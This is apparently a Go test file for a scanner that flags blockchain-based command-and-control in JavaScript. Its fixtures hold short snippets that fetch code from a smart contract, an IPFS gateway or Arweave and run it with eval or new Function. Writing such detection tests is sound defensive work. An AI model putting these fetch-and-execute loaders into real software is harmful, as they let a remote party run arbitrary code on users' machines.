package analyzer

import (
	"strings"
	"testing"
)

func TestBlockchainC2_Web3Import(t *testing.T) {
	a := NewBlockchainC2Analyzer()
	content := `
const Web3 = require('web3');
const web3 = new Web3('https://mainnet.infura.io/v3/key');
const result = await contract.getString();
eval(result);
`
	findings := a.scanContent(content, "c2.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Blockchain library") || strings.Contains(f.Title, "Smart contract") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect blockchain library import for C2")
	}
}

func TestBlockchainC2_EthersImport(t *testing.T) {
	a := NewBlockchainC2Analyzer()
	content := `
const { ethers } = require('ethers');
const provider = new ethers.providers.JsonRpcProvider('https://mainnet.infura.io/v3/key');
`
	findings := a.scanContent(content, "ethers.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Blockchain library") || strings.Contains(f.Title, "Ethereum provider") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect ethers library import")
	}
}

func TestBlockchainC2_SmartContractGetString(t *testing.T) {
	a := NewBlockchainC2Analyzer()
	content := `
const abi = ['function getString() view returns (string)'];
const contract = new ethers.Contract(address, abi, provider);
const cmd = await contract.getString();
eval(cmd);
`
	findings := a.scanContent(content, "contract.js")

	foundABI := false
	foundCall := false
	for _, f := range findings {
		if strings.Contains(f.Title, "ABI") {
			foundABI = true
		}
		if strings.Contains(f.Title, "data retrieval") {
			foundCall = true
		}
	}
	if !foundCall {
		t.Error("Expected to detect smart contract data retrieval call")
	}
	if !foundABI {
		t.Error("Expected to detect smart contract ABI definition")
	}
}

func TestBlockchainC2_EthCall(t *testing.T) {
	a := NewBlockchainC2Analyzer()
	content := `
const payload = JSON.stringify({
  method: 'eth_call',
  params: [{ to: '0x1234...', data: '0xabcdef' }, 'latest']
});
fetch('https://mainnet.infura.io', { method: 'POST', body: payload });
`
	findings := a.scanContent(content, "rpc.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "JSON-RPC") || strings.Contains(f.Title, "eth_call") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect eth_call JSON-RPC call")
	}
}

func TestBlockchainC2_IPFSGateway(t *testing.T) {
	a := NewBlockchainC2Analyzer()
	content := `
const payload = await fetch('https://ipfs.io/ipfs/QmXoypizjW3WknFiJnKLwHCnL72vedxjQkDDP1mXWo6uco');
eval(await payload.text());
`
	findings := a.scanContent(content, "ipfs.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "IPFS") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect IPFS gateway content fetch")
	}
}

func TestBlockchainC2_ArweaveStorage(t *testing.T) {
	a := NewBlockchainC2Analyzer()
	content := `
const data = await fetch('https://arweave.net/bNbA3TEQVL60xlgCcqdz4ZPHFZ711cZ3hmkpGttDt_U');
const script = await data.text();
new Function(script)();
`
	findings := a.scanContent(content, "arweave.js")

	found := false
	for _, f := range findings {
		if strings.Contains(f.Title, "Arweave") {
			found = true
			break
		}
	}
	if !found {
		t.Error("Expected to detect Arweave permanent storage fetch")
	}
}

func TestBlockchainC2_CleanCode(t *testing.T) {
	a := NewBlockchainC2Analyzer()
	content := `
const express = require('express');
const app = express();
app.post('/api/data', (req, res) => {
  res.json({ ok: true });
});
app.listen(3000);
`
	findings := a.scanContent(content, "api.js")
	for _, f := range findings {
		if f.Severity >= SeverityHigh {
			t.Errorf("Unexpected high severity finding in clean code: %s", f.Title)
		}
	}
}
